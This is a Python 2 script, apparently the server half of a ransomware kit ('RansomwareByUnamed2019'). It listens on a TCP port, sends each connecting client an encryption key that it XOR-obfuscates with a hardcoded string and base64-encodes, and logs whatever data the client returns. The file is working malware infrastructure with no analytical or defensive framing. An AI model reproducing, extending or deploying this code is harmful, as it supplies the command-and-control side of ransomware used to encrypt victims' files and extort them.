#!/usr/bin/python2
#-*- coding:utf-8 -*-

import sys
from itertools import cycle, izip
import base64
import threading

try:
    import nclib
except ImportError:
    print("\033[31m[!] Error Nclib Not Found !")


def xor_crypt(data, key, encode=False, decode=False):
    if decode:
        data = base64.decodestring(data)
    xored = ''.join(chr(ord(x) ^ ord(y)) for (x,y) in izip(data, cycle(key)))
    if encode:
        return base64.encodestring(xored).strip()
    return xored

def while_listen_packet(connid):
    while True:
        data = connid.recv(4096)
        print(data)

def server(ip,port,key):
    serv = nclib.TCPServer((ip,port))
    print("\033[32m[\033[34m+\033[32m] Server Started %s:%s" % (ip,port))
    for client in serv:
        print("\033[32m[\033[34m+\033[32m] New Client Connected => %s " % (client.peer[0]))
        encrypted_key = xor_crypt(key,"RansomwareByUnamed2019_Key_Encrypt",encode=True)
        client.send(encrypted_key)
        print("\033[32m[\033[34m+\033[32m] Key Sent => %s " % (encrypted_key))
        data = client.recv(4096)
        print(data)
        client.close()

if __name__ == '__main__':
    if len(sys.argv) < 4:
        print("usage : %s <ip> <port> <key>" % (sys.argv[0]))
    else:
        try:
            server(sys.argv[1],int(sys.argv[2]),sys.argv[3])
        except:
            print("\033[31m[\033[34m+\033[31m] Error Starting Server !")